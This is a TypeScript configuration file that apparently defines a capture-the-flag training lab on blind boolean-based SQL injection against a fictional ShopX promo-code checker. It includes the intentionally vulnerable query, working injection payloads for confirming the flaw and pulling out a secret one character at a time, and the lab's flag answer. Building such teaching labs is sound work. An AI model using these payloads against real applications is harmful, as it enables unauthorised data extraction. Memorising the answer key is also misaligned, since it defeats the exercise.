import type { LabMetadata } from '../../../types/lab-metadata.type';

export const lab3Metadata: LabMetadata = {
  slug: 'sqli-blind-boolean',
  title: 'SQL Injection: Blind Boolean-Based Extraction',
  ar_title: 'حقن SQL: الاستخراج الأعمى (Boolean-Based)',
  description:
    "ShopX's promo code endpoint returns only 'valid' or 'invalid' — but it is vulnerable to Blind SQL Injection. Extract a hidden admin secret one character at a time.",
  ar_description:
    "نقطة التحقق من الكوبون في ShopX ترجع فقط 'صالح' أو 'غير صالح' — لكنها عرضة لـ Blind SQLi. استخرج السر المخفي حرفًا بحرف.",
  difficulty: 'ADVANCED',
  category: 'WEB_SECURITY',
  skills: [
    'SQL Injection',
    'Blind SQLi',
    'Boolean Inference',
    'Character-by-Character Extraction',
    'Automated Exploitation',
  ],
  xpReward: 350,
  pointsReward: 175,
  duration: 60,
  executionMode: 'SHARED_BACKEND',
  isPublished: true,

  goal: 'Extract the full admin secret using Boolean-based Blind SQLi in the promo code validator.',
  scenario: {
    context:
      "ShopX's checkout page validates promo codes. The response is always binary — no data, no errors. " +
      "An admin note containing the flag was stored as a private content entry with title='admin_secret'. " +
      'Extract it character by character using boolean conditions.',
    vulnerableCode:
      'SELECT id FROM "LabGenericContent"\n' +
      "WHERE userId='...' AND labId='..'\n" +
      "AND title='valid_coupon' AND body='COUPON_INPUT'",
    exploitation:
      "1) Confirm: ' OR '1'='1'-- → 'Coupon applied!'\n" +
      "2) Extract char: ' OR (SELECT SUBSTRING(body,1,1) FROM \"LabGenericContent\" WHERE title='admin_secret' LIMIT 1)='F'--\n" +
      '3) Iterate position + charset → assemble full flag → submit.',
  },
  hints: [
    {
      order: 1,
      xpCost: 10,
      content:
        "Confirm injection: ' OR '1'='1'-- → should return 'Coupon applied!'",
    },
    {
      order: 2,
      xpCost: 20,
      content:
        "A secret note exists with title='admin_secret'. Confirm: ' OR (SELECT COUNT(*) FROM \"LabGenericContent\" WHERE title='admin_secret') > 0 --",
    },
    {
      order: 3,
      xpCost: 40,
      content:
        "Extract one char: ' OR (SELECT SUBSTRING(body,1,1) FROM \"LabGenericContent\" WHERE title='admin_secret' LIMIT 1) = 'F'--",
    },
    {
      order: 4,
      xpCost: 60,
      content:
        'Write a script: loop position 1→35, try charset A-Z/0-9/{/}/_. Assemble the full flag and submit.',
    },
  ],

  flagAnswer: 'FLAG{BLIND_SQLI_EXFIL_SUCCESS}',
  initialState: {
    contents: [
      {
        title: 'valid_coupon',
        body: 'SAVE20SUMMER',
        isPublic: true,
        author: 'marketing',
      },
      {
        title: 'valid_coupon',
        body: 'FLASH50OFF',
        isPublic: true,
        author: 'marketing',
      },
      {
        title: 'valid_coupon',
        body: 'WELCOME10',
        isPublic: true,
        author: 'marketing',
      },
      {
        title: 'admin_secret',
        body: 'FLAG{BLIND_SQLI_EXFIL_SUCCESS}',
        isPublic: false,
        author: 'admin',
      },
    ],
  },
};
